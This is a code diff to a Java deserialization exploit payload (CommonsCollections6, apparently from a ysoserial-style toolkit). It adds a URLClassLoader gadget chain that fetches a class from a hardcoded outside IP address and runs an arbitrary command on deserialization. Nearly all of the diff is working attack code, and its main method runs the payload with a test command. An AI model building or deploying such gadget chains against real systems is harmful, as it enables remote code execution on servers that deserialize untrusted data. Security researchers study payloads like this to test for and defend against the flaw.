@@ -37,7 +37,13 @@ import java.util.Map;
 @Authors({ Authors.MATTHIASKAISER })
 public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<Serializable> {
 
+    @Override
     public Serializable getObject(final String command) throws Exception {
+        return getObjectExec(command);
+        //return getObjectURLClassLoader(command);
+    }
+
+    public Serializable getObjectExec(final String command) throws Exception {
 
         final String[] execArgs = new String[] { command };
 
@@ -103,7 +109,102 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
 
     }
 
+    public Serializable getObjectURLClassLoader(final String command) throws Exception {
+
+        final String[] execArgs = new String[] { command };
+
+        String url = "http://39.106.143.48:8999/";
+        String className = "ErrorBaseExec";
+        String cmd = command;
+        String method = "do_exec";
+        final Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(java.net.URLClassLoader.class),
+                new InvokerTransformer(
+                        "getConstructor",
+                        new Class[] {Class[].class},
+                        new Object[] {new Class[]{java.net.URL[].class}}
+                ),
+                new InvokerTransformer(
+                        "newInstance",
+                        new Class[] {Object[].class},
+                        new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(url) }}}
+                ),
+                new InvokerTransformer(
+                        "loadClass",
+                        new Class[] { String.class },
+                        new Object[] { className }
+                ),
+                new InvokerTransformer(
+                        "getMethod",
+                        new Class[]{String.class, Class[].class},
+                        new Object[]{method, new Class[]{String.class}}
+                ),
+                new InvokerTransformer(
+                        "invoke",
+                        new Class[]{Object.class, Object[].class},
+                        new Object[]{null, new String[]{cmd}}
+                )
+        };
+        /*
+            URLClassLoader.class.getConstructor(java.net.URL[].class).newInstance(new java.net.URL("url"))
+                    .loadClass("remote_class").getMethod("do_exec", String.class).invoke(null, "cmd");
+
+        */
+
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        final Map innerMap = new HashMap();
+
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
+
+        HashSet map = new HashSet(1);
+        map.add("foo");
+        Field f = null;
+        try {
+            f = HashSet.class.getDeclaredField("map");
+        } catch (NoSuchFieldException e) {
+            f = HashSet.class.getDeclaredField("backingMap");
+        }
+
+        f.setAccessible(true);
+        HashMap innimpl = (HashMap) f.get(map);
+
+        Field f2 = null;
+        try {
+            f2 = HashMap.class.getDeclaredField("table");
+        } catch (NoSuchFieldException e) {
+            f2 = HashMap.class.getDeclaredField("elementData");
+        }
+
+
+        f2.setAccessible(true);
+        Object[] array = (Object[]) f2.get(innimpl);
+
+        Object node = array[0];
+        if(node == null){
+            node = array[1];
+        }
+
+        Field keyField = null;
+        try{
+            keyField = node.getClass().getDeclaredField("key");
+        }catch(Exception e){
+            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
+        }
+
+        keyField.setAccessible(true);
+        keyField.set(node, entry);
+
+        return map;
+
+    }
+
+
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections6.class, args);
+        //PayloadRunner.run(CommonsCollections6.class, args);
+        //PayloadRunner.run(CommonsCollections6.class, new String[]{"/Applications/Calculator.app/Contents/MacOS/Calculator"});
+        PayloadRunner.run(CommonsCollections6.class, new String[]{"id"});
     }
 }
